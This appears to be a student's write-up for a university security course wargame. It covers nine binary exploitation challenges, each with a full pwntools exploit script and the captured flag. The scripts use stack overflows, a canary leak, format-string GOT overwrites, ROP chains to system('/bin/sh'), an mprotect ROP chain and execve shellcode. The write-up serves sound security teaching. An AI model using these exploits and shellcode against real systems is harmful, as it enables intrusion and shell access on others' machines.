# **COMP6447 Wargame 3** - Johnathan Liauw (z5136212)
## **1. buffer-4 - shellz**
_General Overview of Problems faced:_
None

_List of vulnerabilities:_
1. User's input can overflow the buffer and overwrite the return address

_Steps to exploit:_
1. Find the offset to overwrite the return address
2. From the binary, I know that the buffer address is still stored in eax when the program returns, therefore I can use a _"call eax"_ gadget to beat ASLR

_Script/Command used:_
```python
#!/usr/bin/python 

from pwn import *

host = "wargames.6447.sec.edu.au"
port = 5004

offset = 8204
call_eax = 0x08048406

c = remote(host, port)

payload = "\x90"*8000 
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 
payload += "a"*181
payload += p32(call_eax)

log.info("Sending payload...")

c.sendline(payload)
c.recvlines(2)
c.sendline("cat /flag")
log.success("Flag: %s" %(c.recvuntil('\n')))

c.close()
```
_Flag:_
'6447{1849748d-6e69-4bca-ab03-67b0778ef9bb}'
---
## **2. canary-3 - stack-dump**
_General Overview of Problems faced:_
None

_List of vulnerabilities:_
1. In the _"dump memory"_ function, rather than dumping variable given in the assembly, it is dumping the address stored in the variable and since we can write to the variable in the _"input option"_ function, we can view the value of any address

_Steps to exploit:_
1. Leak the value of the canary with the dump function
2. Send the payload with the canary in the right position and overwrite the return address with the win function address 

_Script/Command used:_
```python
#!/usr/bin/python

from pwn import *
import re

host = "wargames.6447.sec.edu.au"
port = 6003

win_addr = 0x080486cd
offset = 96

c = remote(host, port)

reply = c.recvlines(2)	# starting lines
stack_ptr = re.search('0x(.{8})', reply[1]).group(0)
log.info("Useful stack pointer: %s" % (stack_ptr))

c.recvlines(4)
c.sendline("a")

c.sendline("5")

stack_ptr = int(stack_ptr, 0)
stack_ptr += 105

payload_leak = p32(stack_ptr)
payload_leak += "\n"

c.sendline(payload_leak)

c.recvlines(10)

c.sendline("b")

canary = c.recvline()
canary = canary[22:26]
log.info("Canary found...")

c.recvlines(4)

addr_offset = cyclic_find(0x61616164)

size = offset + 4 + addr_offset + 4 + 1
c.sendline("a")
c.sendline(str(size))

payload_return = "a"*offset
payload_return += canary
#payload_return += cyclic(size-offset-4-1)
payload_return += "a"*addr_offset
payload_return += p32(win_addr)
payload_return += "\n"

c.sendline(payload_return)
c.recvlines(10)
c.sendline("d")

c.sendline("cat /flag")
flag = c.recvline()
log.success("Flag: %s" % (flag))
c.close()
```
_Flag:_
'6447{31c83bef-e49b-4104-bdeb-bae408e8ef84}'
---
## **3. format-3 - sploitwarz**
_General overview of problems faced_
1. Have to continue gambling until win so the format string is exploited
2. Have to use the leaked address to calcualte the offset to the win function address

_List of vulnerabilities:_    
1. When the player wins a gamble, the program will print the name without formatting which leads to a format string vulnerability

_Steps to exploit:_
1. Leak the buffer address from the gambling function
2. Calculate the win function address and the putchar GOT address with the offset from the leaked buffer address
3. Overwrite the putchar GOT with the win function address

_Script/Command used:_
```python
#!/usr/bin/python

from pwn import *
import sys
import re

p = remote("wargames.6447.sec.edu.au", 7003)

def send(payload):
	p.sendline(payload)

payload = "aaaa.%1$p"
p.sendline(payload)
p.recvlines(48)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(10)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(43)
	reply = p.recvline()

buffer_addr = re.search('0x(.{8})', reply).group(0)

win = int(buffer_addr, 0) - 0x3978
log.success("Win address at: %s" % (hex(win)))
player = int(buffer_addr, 0) - 0x14
got = player - 0x218
log.success("GOT at: %s" % (hex(got)))
putchar = got + 0x38
log.success("Putchar at: %s" % (hex(putchar)))

p.sendline("")
p.sendline("c")
f = FmtStr(send, offset=9)
f.write(putchar, win)
f.execute_writes()
p.recvlines(66)

p.sendline("g")
p.sendline("0.001")
p.sendline("3")

p.recvlines(10)
reply = p.recvline()
while reply[:5] == "Wrong":
	p.sendline("")
	p.sendline("g")
	p.sendline("0.0001")
	p.sendline("3")
	p.recvlines(43)
	reply = p.recvline()

log.info("Overwritten putchar to win")
p.sendline("")
p.recvlines(1)
flag = p.recvline()
log.success("Flag found: %s" % (flag))
p.close()
```
_Flag:_
'6447{4ee67e05-ec23-4d7a-9b12-b17a3b251656}'
---
## **4. nx-1 - piv\_it**
_General overview of problems faced:_
1. Took me a long time to realise that I should partially rather than fully overwriting
2. Might have to try a few times before success since ASLR is on

_List of vulnerabilities:_
1. User's second input can partially overwrite the ESP value when return

_Steps to exploit:_
1. Calcuate the system call in libc and the string _"/bin/sh"_ with offsets to the leaked address using the  libc database
2. Fill the first buffer which is the bigger one with ret sled then lastly a call to system with _"/bin/sh"_
3. Fill the second buffer with 20 characters which will then partially overwrite the last byte of the ESP with _"0x0a"_ and hopefully point it back to the ret sled in the bigger buffer

_Script/Command used:_
```python
#!/usr/bin/python

from pwn import *
import re

c = remote("wargames.6447.sec.edu.au", 8001)

ret = 0x08048199	# ret

reply = c.recvline()
printf_got = re.search("0x(.{8})", reply).group(0)
log.info("Printf_got at: %s" % (printf_got))

printf_got = int(printf_got, 0)
system = printf_got - 0xe8d0
#system = printf_got - 0x13E50
command = printf_got + 0x11239b
#command = printf_got + 0x12B338

log.info("System at %s" % (hex(system)))
log.info("Command at %s" % (hex(command)))

ret_len = (128-12)/4 - 1
payload1 = "aa"
for i in range(ret_len):
	payload1 += p32(ret)
payload1 += p32(system)
payload1 += "AAAA"
payload1 += p32(command)
payload1 += "a"

c.sendline(payload1)

payload2 = "a"*20
c.sendline(payload2)

c.interactive()
```
_Flag:_
'6447{38b126bc-24b0-404d-81db-7a2f74ea4941}'
---
## **5. nx-2 - roproprop**
_General overview of problems faced:_
1. Took me a long time to realise it is partial overwriting

_List of vulnerabilities:_
1. User's input can overwrite the ESP value when return

_Step to exploit:_
1. Calcuate the system call in libc and the string _"/bin/sh"_ with offsets to the leaked address using the  libc database
2. Fill the buffer with ret sled then the system call to _"/bin/sh"_ all packed in a size of 1337 bytes
3. The last byte of ESP will be partially overwriten with _"0x0a"_ and point back to the ret sled in the buffer

_Script/Command used:_
```python
#!/usr/bin/python

from pwn import *
import re

c = remote("wargames.6447.sec.edu.au", 8002)

offset = 1337
ret = 0x0804833a    # ret

reply = c.recvline()
puts_got = re.search("0x(.{8})", reply).group(0)
log.info("Puts at %s" % (puts_got))
puts_got = int(puts_got, 0)

system_addr = puts_got-0x24f00
sh = puts_got+0xfbd6b
log.info("System at %s" % (hex(system_addr)))
log.info("String sh at %s" % (hex(sh)))

payload = "a"
ret_len = (offset-1-12)/4
for i in range(ret_len):
	payload += p32(ret)
payload += p32(system_addr)
payload += "AAAA"
payload += p32(sh)

log.info("Sending payload...")
c.sendline(payload)

#c.interactive()
c.sendline("cat /flag")
c.recvline()
flag = c.recvline()
log.success("Flag: %s" % (flag))
c.close()
```
_Flag:_
'6447{1403f546-2002-4f3a-8da7-13493dc643b7}'
---
## **6. nx-3 - swrop**
_General overview of problems faced:_
None

_List of vulnerabilities:_
1. User's input can overwrite the return address

_Step to exploit:_
1. Find the addresses of _"/bin/bash"_ and system call in the binary
2. Overwrite the return address with the system call then the address of _"/bin/bash"_ after

_Script/Command used:_
```python
#!/usr/bin/python

from pwn import *

c = remote("wargames.6447.sec.edu.au", 8003)

offset = 140
command = 0x08048600
system = 0x080484d8

payload = "a"*140
payload += p32(system)
payload += p32(command)

log.info("Sending payload...")
c.sendline(payload)
log.info("Executing shell...")
c.sendline("cat /flag")
c.recvlines(1)
flag = c.recvline()[2:]
log.success("Flag: %s" % (flag))

c.close()
```
_Flag:_
'6447{1feda6d2-8033-4c40-86cb-f46c2ad98888}'
---
## **7. nx-4 - static**
_General overview of problems faced:_
1. Have to figure out how mprotect works
2. Have to move the ESP to the executable address after call mprotect
3. Have to add a _"xor edx, edx"_ before my shellcode to ensure it runs properly

_List of vulnerabilities:_
1. User's input can overwrite the return address

_Step to exploit:_
1. The first part of the rop chain is the change the global variable storing the stack protection permission to 7 which makes it executable
2. The second part of the rop chain is to put the global variable _"libc-stack-end"_ in EAX then call the stack protection function
3. The third part of the rop chain is to move the ESP to an executable address by keep calling a _"ret"_ gadget
4. Finally put a _"call esp"_ gadget and the shellcode afterwards

_Script/Command used:_
```python
#!/usr/bin/python

from pwn import *

c = remote("wargames.6447.sec.edu.au", 8004)

shellcode = "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

offset = 12
prot_func = 0x0809ac20	# function address of make_stack_executable
stack_prot = 0x080e9fec	# global variable of the stack permission
stack_end = 0x080e9fc4	# global variable of libc_stack_end
pop_edx = 0x0806eada	# pop edx ; ret
pop_eax = 0x080bb236	# pop eax ; ret
init_value = 0xffffffff	# value -1 to start incrementing with, avoid any null bytes
inc_eax = 0x0807b52f	# inc eax ; ret
call_esp = 0x08089700	# call esp
mov_edx_eax = 0x0809a54d	# mov dword ptr [edx], eax ; ret
add_esp = 0x0806b869

payload = "a"*offset
payload += p32(pop_edx)
payload += p32(stack_prot)
payload += p32(pop_eax)
payload += p32(init_value)
for i in range(8):	# add 8 to ecx
	payload += p32(inc_eax)

payload += p32(mov_edx_eax)
payload += p32(pop_eax)
payload += p32(stack_end)
payload += p32(prot_func)
for i in range(150):
	payload += p32(add_esp)

payload += p32(call_esp)
payload += shellcode
log.info("Sending payload...")
c.sendline(payload)
c.sendline("cat /flag")
c.recvline()
flag = c.recvline()
log.success("Flag: %s" % (flag))

c.close()
```
_Flag:_
'6447{698fe9fd-1c5e-4992-b2c0-6df10e7e718a}'
---
## **8. misc-1 - simple**
_General overview of problems faced:_
None

_List of vulnerabilities:_
1. Not reallt a vulnerability, it just execute my shellcode but can't used anything syscall other than read and write

_Step to exploit:_
1. Write my shellcode
2. Send my shellcode

_Script/Command used:_
```
BITS 32;
	
	xor ebx, ebx
	xor edx, edx
	mov bx, 0x3e8;
	mov ecx, esp;
	mov dl, 43;
	xor eax, eax
	mov al, 0x03;
	int 0x80;
	xor ebx, ebx
	mov bl, 0x1;
	mov dl, 43;
	mov al, 0x04;
	int 0x80;
```
```python
#!/usr/bin/python

from pwn import *

c = remote("misc.6447.sec.edu.au", 8005)


shellcode = "\x31\xdb\x31\xd2\x66\xbb\xe8\x03\x89\xe1\xb2\x2b\x31\xc0\xb0\x03\xcd\x80\x31\xdb\xb3\x01\xb2\x2b\xb0\x04\xcd\x80"

log.info("Sending payload...")
c.sendline(shellcode)
c.recvlines(9)

flag = c.recvline()
log.success("Flag: %s" % (flag))

c.close()
```
_Flag:_
'6447{916709a2-490a-4ee1-b631-62452673a148}'
---
## **9. misc-2 - egg**
_General overview of problems faced:_
None

_List of vulnerabilities:_
1. Not reallt a vulnerability, it just execute my shellcode but can't used anything syscall other than read and write

_Step to exploit:_
1. Since the address of the big buffer can be found with an offset from the ESP, the small shellcode will simply call to that address
2. The big shellcode will be the same as simple

_Script/Command used:_
```
BITS 32;
	
	mov eax, dword [esp + 0x3c];
	call eax;
```
```python
#!/usr/bin/python

from pwn import *

#c = process("binaries/egg")
c = remote("misc.6447.sec.edu.au", 8006)
#c = gdb.debug("./binaries/egg")

big_shellcode = "\x31\xdb\x31\xd2\x66\xbb\xe8\x03\x89\xe1\xb2\x2b\x31\xc0\xb0\x03\xcd\x80\x31\xdb\xb3\x01\xb2\x2b\xb0\x04\xcd\x80"
small_shellcode = "\x8b\x44\x24\x3c\xff\xd0"

log.info("Sending small payload and big payload...")
c.sendline(small_shellcode)
c.sendline(big_shellcode)

c.recvlines(19)
flag = c.recvline()
log.success("Flag: %s" % (flag))

c.close()
```
_Flag:_
'6447{16baa76c-2d52-4972-be1b-d8b600e2c335}'
--- 
